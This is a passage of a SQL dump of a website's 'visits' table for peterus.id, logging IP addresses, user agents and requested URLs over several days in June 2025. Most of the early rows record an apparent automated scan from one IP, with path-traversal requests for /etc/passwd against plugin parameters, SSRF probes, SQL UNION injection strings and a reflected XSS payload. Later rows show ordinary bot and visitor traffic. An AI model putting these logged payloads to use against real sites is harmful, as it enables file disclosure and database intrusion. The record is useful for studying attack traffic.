(879, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jwhmcs', '2025-06-28 01:55:11', '2025-06-28 01:55:11'),
(880, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jradio', '2025-06-28 01:55:21', '2025-06-28 01:55:21'),
(881, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-28 01:55:50', '2025-06-28 01:55:50'),
(882, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/?filename=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_helpdeskpro&original_filename=AnyFileName.exe&task=ticket.download_attachment', '2025-06-28 01:57:14', '2025-06-28 01:57:14'),
(883, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-28 01:57:35', '2025-06-28 01:57:35'),
(884, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15', 'https://peterus.id/?url=http%3A%2F%2F0177.0.0.1%2Fserver-status', '2025-06-28 01:57:46', '2025-06-28 01:57:46'),
(885, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/?host=http%3A%2F%2F0177.0.0.1%2Fserver-status', '2025-06-28 01:57:50', '2025-06-28 01:57:50'),
(886, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/?file=http%3A%2F%2F0177.0.0.1%2Fetc%2Fpasswd', '2025-06-28 01:57:54', '2025-06-28 01:57:54'),
(887, '156.246.17.42', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id/?filename=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_helpdeskpro&original_filename=AnyFileName.exe&task=ticket.download_attachment', '2025-06-28 01:58:58', '2025-06-28 01:58:58'),
(888, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-28 02:00:16', '2025-06-28 02:00:16'),
(889, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15', 'https://peterus.id/index.php?q=hiring&search=URC%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2Cmd5%28999999999%29%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19--%20', '2025-06-28 02:02:28', '2025-06-28 02:02:28'),
(890, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://www.peterus.id/?url=http%3A%2F%2F0177.0.0.1%2Fserver-status', '2025-06-28 02:02:54', '2025-06-28 02:02:54'),
(891, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?host=http%3A%2F%2F0177.0.0.1%2Fserver-status', '2025-06-28 02:02:58', '2025-06-28 02:02:58'),
(892, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15', 'https://www.peterus.id/?file=http%3A%2F%2F0177.0.0.1%2Fetc%2Fpasswd', '2025-06-28 02:03:02', '2025-06-28 02:03:02'),
(893, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id', '2025-06-28 02:03:49', '2025-06-28 02:03:49'),
(894, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/120.0 Safari/537.36', 'https://www.peterus.id/index.php?q=hiring&search=URC%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2Cmd5%28999999999%29%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19--%20', '2025-06-28 02:04:14', '2025-06-28 02:04:14'),
(895, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://peterus.id/?query=SHOW%20DATABASES', '2025-06-28 02:06:48', '2025-06-28 02:06:48');
INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
(896, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1', 'https://peterus.id/?pp=env', '2025-06-28 02:07:44', '2025-06-28 02:07:44'),
(897, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id/?query=SHOW%20DATABASES', '2025-06-28 02:08:34', '2025-06-28 02:08:34'),
(898, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id/?pp=env', '2025-06-28 02:09:35', '2025-06-28 02:09:35'),
(899, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id/index.php?r=installer%2Fwelcome', '2025-06-28 02:13:28', '2025-06-28 02:13:28'),
(900, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063', 'https://peterus.id', '2025-06-28 02:13:57', '2025-06-28 02:13:57'),
(901, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27', 'https://peterus.id/index.php?download=%2Fetc%2Fpasswd', '2025-06-28 02:14:53', '2025-06-28 02:14:53'),
(902, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id/index.php?r=installer%2Fwelcome', '2025-06-28 02:15:13', '2025-06-28 02:15:13'),
(903, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-28 02:15:46', '2025-06-28 02:15:46'),
(904, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/102.0 Safari/537.36', 'https://www.peterus.id/index.php?download=%2Fetc%2Fpasswd', '2025-06-28 02:16:35', '2025-06-28 02:16:35'),
(905, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id/index.php?target=db_sql.php%253f%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 02:18:09', '2025-06-28 02:18:09'),
(906, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/129.0 Safari/537.36', 'https://www.peterus.id/index.php?target=db_sql.php%253f%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 02:19:55', '2025-06-28 02:19:55'),
(907, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.2; rv:137.0) Gecko/20100101 Firefox/137.0', 'https://peterus.id/index.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%28%27CVE-2021-24666%27%29%2CNULL%2CNULL%2CNULL--%20-&rest_route=%2Fpodlove%2Fv1%2Fsocial%2Fservices%2Fcontributor%2F1', '2025-06-28 02:21:00', '2025-06-28 02:21:00'),
(908, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cmd5%28%27CVE-2021-24666%27%29%2CNULL%2CNULL%2CNULL--%20-&rest_route=%2Fpodlove%2Fv1%2Fsocial%2Fservices%2Fcontributor%2F1', '2025-06-28 02:22:41', '2025-06-28 02:22:41'),
(909, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://peterus.id/index.php?Itemid=12&option=com_jimtawl&task=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-28 02:25:24', '2025-06-28 02:25:24'),
(910, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://www.peterus.id/index.php?Itemid=12&option=com_jimtawl&task=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-28 02:27:08', '2025-06-28 02:27:08'),
(911, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchaimageattach', '2025-06-28 02:27:26', '2025-06-28 02:27:26'),
(912, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchaimageattach', '2025-06-28 02:29:06', '2025-06-28 02:29:06'),
(913, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15', 'https://peterus.id/?patreon_action=serve_patron_only_image&patron_only_image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 02:31:04', '2025-06-28 02:31:04'),
(914, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id/?patreon_action=serve_patron_only_image&patron_only_image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 02:32:49', '2025-06-28 02:32:49'),
(915, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36', 'https://peterus.id/index.php?action=edit&f1=.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2Fetc%2Fpasswd&page=&restore=1', '2025-06-28 02:37:36', '2025-06-28 02:37:36'),
(916, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id/index.php?page=%2Fetc%2Fpasswd%00', '2025-06-28 02:39:21', '2025-06-28 02:39:21'),
(917, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id/index.php?action=edit&f1=.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2F%5C.%2F%2F.%2Fetc%2Fpasswd&page=&restore=1', '2025-06-28 02:39:21', '2025-06-28 02:39:21'),
(918, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0', 'https://peterus.id', '2025-06-28 02:40:03', '2025-06-28 02:40:03'),
(919, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?page=%2Fetc%2Fpasswd%00', '2025-06-28 02:41:07', '2025-06-28 02:41:07'),
(920, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_dioneformwizard', '2025-06-28 02:41:16', '2025-06-28 02:41:16'),
(921, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://www.peterus.id', '2025-06-28 02:41:53', '2025-06-28 02:41:53'),
(922, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://peterus.id/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0%3D', '2025-06-28 02:42:08', '2025-06-28 02:42:08'),
(923, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id', '2025-06-28 02:42:08', '2025-06-28 02:42:08'),
(924, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.2 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_dioneformwizard', '2025-06-28 02:43:02', '2025-06-28 02:43:02'),
(925, '156.246.17.42', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27', 'https://www.peterus.id', '2025-06-28 02:43:49', '2025-06-28 02:43:49'),
(926, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/?layout=%2Fetc%2Fpasswd', '2025-06-28 02:44:29', '2025-06-28 02:44:29'),
(927, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0%3D', '2025-06-28 02:45:34', '2025-06-28 02:45:34'),
(928, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://peterus.id/?a=display&templateFile=README.md', '2025-06-28 02:45:46', '2025-06-28 02:45:46'),
(929, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15', 'https://www.peterus.id/?layout=%2Fetc%2Fpasswd', '2025-06-28 02:46:11', '2025-06-28 02:46:11'),
(930, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.1', 'https://peterus.id', '2025-06-28 02:47:20', '2025-06-28 02:47:20'),
(931, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/?a=display&templateFile=README.md', '2025-06-28 02:47:29', '2025-06-28 02:47:29'),
(932, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-28 02:49:04', '2025-06-28 02:49:04'),
(933, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/106.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_abbrev', '2025-06-28 02:50:31', '2025-06-28 02:50:31'),
(934, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Safari/605.1.15', 'https://peterus.id/?score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&subreddit=news', '2025-06-28 02:51:57', '2025-06-28 02:51:57'),
(935, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_abbrev', '2025-06-28 02:52:13', '2025-06-28 02:52:13'),
(936, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&subreddit=news', '2025-06-28 02:53:37', '2025-06-28 02:53:37'),
(937, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchafieldsattach', '2025-06-28 02:54:33', '2025-06-28 02:54:33'),
(938, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-28 02:54:53', '2025-06-28 02:54:53'),
(939, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/113.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchafieldsattach', '2025-06-28 02:55:37', '2025-06-28 02:55:37'),
(940, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchadownloadsattach', '2025-06-28 02:55:44', '2025-06-28 02:55:44'),
(941, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-28 02:55:55', '2025-06-28 02:55:55'),
(942, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchadownloadsattach', '2025-06-28 02:56:26', '2025-06-28 02:56:26'),
(943, '20.171.207.18', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://peterus.id', '2025-06-28 03:09:58', '2025-06-28 03:09:58'),
(944, '20.171.207.18', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://peterus.id', '2025-06-28 03:10:01', '2025-06-28 03:10:01'),
(945, '196.251.88.64', 'Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)', 'https://www.peterus.id', '2025-06-28 04:44:54', '2025-06-28 04:44:54'),
(946, '165.154.40.10', 'curl/7.29.0', 'https://peterus.id', '2025-06-28 06:31:59', '2025-06-28 06:31:59'),
(947, '152.32.134.89', 'Mozilla/5.0 (Windows NT 7_0; Win64; x64) AppleWebKit/541.50 (KHTML, like Gecko) Chrome/78.0.1175 Safari/537.36', 'https://peterus.id', '2025-06-28 06:32:38', '2025-06-28 06:32:38'),
(948, '196.251.88.64', 'Mozilla/5.0 (Windows NT 6.0; rv:36.0) Gecko/20100101 Firefox/36.0 SeaMonkey/2.33.1', 'https://peterus.id', '2025-06-28 07:20:54', '2025-06-28 07:20:54'),
(949, '149.57.180.58', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-28 16:08:46', '2025-06-28 16:08:46'),
(950, '114.10.65.134', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-28 22:54:10', '2025-06-28 22:54:10'),
(951, '138.246.253.7', 'quic-go-HTTP/3', 'https://www.peterus.id', '2025-06-28 23:49:11', '2025-06-28 23:49:11'),
(952, '139.162.124.188', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/537.36 (KHTML', 'https://peterus.id', '2025-06-29 01:22:14', '2025-06-29 01:22:14'),
(953, '139.162.124.188', NULL, 'https://peterus.id', '2025-06-29 01:22:34', '2025-06-29 01:22:34'),
(954, '123.207.198.35', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-06-29 02:06:13', '2025-06-29 02:06:13'),
(955, '123.207.198.35', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-06-29 02:06:13', '2025-06-29 02:06:13'),
(956, '108.136.228.100', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27', 'https://peterus.id', '2025-06-29 02:25:25', '2025-06-29 02:25:25'),
(957, '138.246.253.7', 'quic-go-HTTP/3', 'https://peterus.id', '2025-06-29 04:47:16', '2025-06-29 04:47:16'),
(958, '94.247.172.129', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2)', 'https://www.peterus.id', '2025-06-29 07:00:13', '2025-06-29 07:00:13'),
(959, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-06-29 07:56:28', '2025-06-29 07:56:28'),
(960, '149.57.180.67', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-29 09:39:59', '2025-06-29 09:39:59'),
(961, '157.55.39.11', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-06-29 11:47:15', '2025-06-29 11:47:15'),
(962, '205.210.31.14', NULL, 'https://peterus.id', '2025-06-29 14:08:19', '2025-06-29 14:08:19'),
(963, '47.92.4.147', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id', '2025-06-29 20:55:36', '2025-06-29 20:55:36'),
(964, '47.92.4.147', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id', '2025-06-29 20:55:40', '2025-06-29 20:55:40'),
(965, '20.171.207.8', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://www.peterus.id', '2025-06-29 21:53:52', '2025-06-29 21:53:52'),
(966, '20.171.207.8', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)', 'https://www.peterus.id', '2025-06-29 21:53:54', '2025-06-29 21:53:54'),
(967, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-30 01:10:46', '2025-06-30 01:10:46'),
(968, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-30 01:10:51', '2025-06-30 01:10:51'),
(969, '36.89.117.227', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-30 06:00:51', '2025-06-30 06:00:51'),
(970, '223.89.21.201', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'https://www.peterus.id', '2025-06-30 06:31:49', '2025-06-30 06:31:49'),
(971, '185.177.72.111', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://www.peterus.id/index.php', '2025-06-30 12:41:15', '2025-06-30 12:41:15'),
(972, '185.177.72.111', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'https://peterus.id/index.php', '2025-06-30 12:41:20', '2025-06-30 12:41:20'),
(973, '5.133.192.108', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-30 13:38:13', '2025-06-30 13:38:13'),
(974, '103.59.160.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-06-30 14:46:22', '2025-06-30 14:46:22'),
(975, '157.55.39.12', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-06-30 17:43:43', '2025-06-30 17:43:43'),
(976, '23.27.145.226', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-30 20:08:26', '2025-06-30 20:08:26'),
(977, '149.57.180.192', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-30 20:38:32', '2025-06-30 20:38:32'),
(978, '43.142.179.19', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://peterus.id', '2025-06-30 22:14:29', '2025-06-30 22:14:29'),
(979, '43.142.179.19', 'Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36', 'https://www.peterus.id', '2025-06-30 22:14:29', '2025-06-30 22:14:29'),
